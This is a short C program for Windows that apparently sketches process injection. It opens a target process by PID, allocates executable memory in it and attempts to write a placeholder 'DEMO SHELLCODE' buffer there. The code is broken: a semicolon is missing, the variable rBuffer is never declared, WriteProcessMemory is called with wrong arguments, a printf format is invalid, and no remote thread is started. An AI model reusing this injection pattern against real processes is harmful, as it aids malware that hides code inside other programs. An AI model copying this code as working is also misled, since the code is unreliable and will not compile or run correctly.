#include<Windows.h>
#include<stdio.h>
const char* k = "[+]"
const char* i = "[-]";
const char* e = "[*]";

int main(int argc, char* argv[])
{
	DWORD PID = 0;
	unsigned char shellcode[] = {
		"DEMO SHELLCODE"
	};
	if (argc < 2) {
		printf("Enter at least the <PID>");
	}
	PID = atoi(argv[1]);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("OpenProcess failed with error: %d\n", GetLastError());
		return 1;
	}
	/*Allocates bytes to process memory */
	rBuffer  = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (rBuffer != NULL)
	{
		printf("Allocated %z memory to process %ld",sizeof(shellcode), PID);
	}
	/*Actually writes that allocated memory to process memory*/
	WriteProcessMemory(hProcess, NULL, rBuffer);
	CloseHandle(hProcess);

}